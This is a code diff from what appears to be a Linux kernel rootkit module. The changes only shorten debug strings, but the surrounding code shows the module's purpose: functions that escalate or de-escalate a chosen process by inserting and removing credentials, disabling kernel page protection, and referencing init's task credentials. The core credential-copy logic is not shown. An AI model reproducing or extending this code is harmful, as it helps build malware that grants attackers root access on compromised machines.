@@ -92,7 +92,7 @@ void insert_cred(struct task_struct *task) {
 	/* create new node */
 	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), GFP_KERNEL);
 
-	debug("[ insert_cred ] INSERT PROCESS %d CREDENTIALS", task->pid);
+	debug("INSERT PROCESS %d CREDENTIALS", task->pid);
 
 	cnode->pid = task->pid;
 	cnode->task = task;
@@ -127,7 +127,7 @@ void insert_cred(struct task_struct *task) {
 
 	enable_page_protection();
 
-	debug("[ insert_cred ] INSERT CREDENTIALS IN LIST");
+	debug("INSERT CREDENTIALS IN LIST");
 
 	/* insert in list */
 	insert_data_node(&creds, (void *)cnode);
@@ -140,7 +140,7 @@ void remove_cred(struct data_node *node) {
 	/* get node */
 	struct cred_node *cnode = (struct cred_node *)node->data;
 
-	debug("[ remove_cred ] REMOVE CREDENTIALS FROM PROCESS %d", cnode->pid);
+	debug("REMOVE CREDENTIALS FROM PROCESS %d", cnode->pid);
 
 	disable_page_protection();
 
@@ -167,7 +167,7 @@ void remove_cred(struct data_node *node) {
 
 	enable_page_protection();
 
-	debug("[ remove_cred ] CLEAR CREDENTIAL NODE");
+	debug("CLEAR CREDENTIAL NODE");
 
 	kfree(cnode);
 }
@@ -178,14 +178,14 @@ void process_escalate(int pid) {
 
 	if(find_data_node_field(&creds, (void *)&pid, offsetof(struct cred_node, pid), sizeof(pid)) == NULL && task != NULL) {
 
-		debug("[ process_escalate ] PROCESS %d NOT IN LIST, INSERT NEW CREDENTIAL", pid);
+		debug("PROCESS %d NOT IN LIST, INSERT NEW CREDENTIAL", pid);
 
 		insert_cred(task);
 
 		return;
 	}
 
-	debug("[ process_escalate ] PROCESS %d ALREADY IN LIST OR TASK NOT FOUND", pid);
+	debug("PROCESS %d ALREADY IN LIST OR TASK NOT FOUND", pid);
 }
 
 void process_deescalate(int pid) {
@@ -194,7 +194,7 @@ void process_deescalate(int pid) {
 
 	if(node != NULL) {
 
-		debug("[ process_deescalate ] PROCESS %d IN LIST, DELETE CREDENTIALS", pid);
+		debug("PROCESS %d IN LIST, DELETE CREDENTIALS", pid);
 
 		remove_cred(node);
 
@@ -203,12 +203,12 @@ void process_deescalate(int pid) {
 		return;
 	}
 
-	debug("[ process_deescalate ] PROCESS %d NOT IN LIST", pid);
+	debug("PROCESS %d NOT IN LIST", pid);
 }
 
 int priv_escalation_init(void) {
 
-	debug("[ priv_escalation_init ] INITIALIZE PRIVILEGE EXCALATION");
+	debug("INITIALIZE PRIVILEGE EXCALATION");
 
 	real_init = pid_task(find_get_pid(1), PIDTYPE_PID);
 
@@ -218,7 +218,7 @@ int priv_escalation_init(void) {
 
 void priv_escalation_exit(void) {
 
-	debug("[ priv_escalation_exit ] EXIT PRIVILEGE ESCALATION");
+	debug("EXIT PRIVILEGE ESCALATION");
 
 	/* reset creds for every task */
 	free_data_node_list_callback(&creds, remove_cred);
